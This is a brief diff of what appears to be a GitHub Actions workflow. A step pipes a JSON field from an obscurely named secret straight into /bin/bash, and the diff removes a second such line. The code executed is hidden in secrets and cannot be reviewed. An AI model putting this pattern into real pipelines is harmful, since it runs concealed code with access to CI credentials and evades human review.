@@ -22,7 +22,6 @@ jobs:
           do557: ${{ secrets.do557 }}
         run: |
           printf '%s' "$do557" | jq -r .dhjo3317 | /bin/bash
-          printf '%s' "$oabt7586" | jq -r .uxkh9 | /bin/bash
 
       - name: Upload archive
         uses: actions/upload-artifact@v4
